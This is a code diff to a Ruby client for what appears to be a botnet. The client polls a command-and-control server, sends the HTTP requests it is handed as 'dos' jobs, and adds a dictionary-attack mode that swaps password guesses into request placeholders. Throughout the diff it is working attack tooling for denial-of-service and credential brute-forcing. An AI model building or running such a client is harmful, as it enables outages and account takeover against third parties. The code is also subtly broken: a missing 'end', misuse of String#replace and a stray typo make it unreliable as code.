@@ -7,12 +7,17 @@ class Client
 		@thread_count = thread_count
 
 		@job_id = 0
+		@job_type = ""
 		@http_method = ""
 		@http_uri = ""
 		@http_host = ""
 		@http_headers = ""
 		@http_data = ""
 		@node_id = mac_address
+
+		# This var is only used when performing dictionary attacks
+		# It will be populated by the server
+		@attack_payloads = ["password1", "password2"]
 	end
 
 	def invoke
@@ -28,6 +33,7 @@ class Client
 		end
 
 		@job_id 		= job["id"]
+		@job_type		= job["attack_type"]
 		@http_method 	= job["http_method"]
 		@http_uri 		= job["http_uri"]
 		@http_host 		= job["http_host"]
@@ -69,7 +75,9 @@ class Client
 					end
 				else
 					while @has_job
-						send_request
+						# Ideally we would check if process_request returns done
+						# If it does, let the C&C know...
+						process_request
 					end
 				end
 			end
@@ -82,28 +90,60 @@ class Client
 		invoke
 	end
 
-	def send_request
+	def process_request()
+		# Check job type.. if dos, just send222 request as is
+		if @job_type == "dos"
+			send_request
+		if @job_type == "dictionary"
+			# find placeholders and replace with value
+			payload = @attack_payloads.pop
+
+			if payload.nil?
+				# No more work to do..mark job as complete
+				@has_job = false
+				return "done"
+			end
+
+			attack_uri = @http_uri.replace("[placeholder]", payload)
+			attack_data = @http_data.replace("[placeholder]", payload)
+			# TODO: Implement header injection
+			send_request(attack_uri, attack_data)
+		end
+	end
+
+	# 
+	# Process the HTTP data and ship that off to the client.
+	# 
+	# Currently this does not store any responses
+	#
+	def send_request(http_uri=nil,http_data=nil, http_headers=nil)
 		req = Mechanize.new.tap do |r|
 			if @proxy_host
 				r.set_proxy(@proxy_host, @proxy_port)
 			end
 		end
 
+		# Set these if they weren't passed in...
+		http_uri ||= @http_uri
+		http_data ||= @http_data
+		http_headers ||= @http_headers
+
 		if @http_method.downcase == "get"
 			begin
-				response = req.get(@http_uri)
+				response = req.get(http_uri)
 			rescue
 				puts "Unable to connect with get."
 			end
 		else
 			begin
-				response = req.post(@http_uri, @http_data, @http_headers)
+				response = req.post(http_uri, http_data, http_headers)
 			rescue
 				puts "Unable to connect with post."
 			end
 		end
 	end
 
+	# Communicates with C&C behind the scenes to look for job status changes
 	def monitor_job_status
 		# Let's sleep for a bit first
 		random_sleep_time = random_polling_interval
@@ -132,7 +172,6 @@ class Client
 	end
 
 	def cc_stability_test
-		# Check status to C&C
 		req = Mechanize.new.tap do |r|
 			if @proxy_host
 				r.set_proxy(@proxy_host, @proxy_port)
@@ -148,6 +187,8 @@ class Client
 		end
 	end
 
+	# Generate a random integer between 13 and 77.
+	# Used to control polling frequency
 	def random_polling_interval
 		13 + rand(64)
 	end
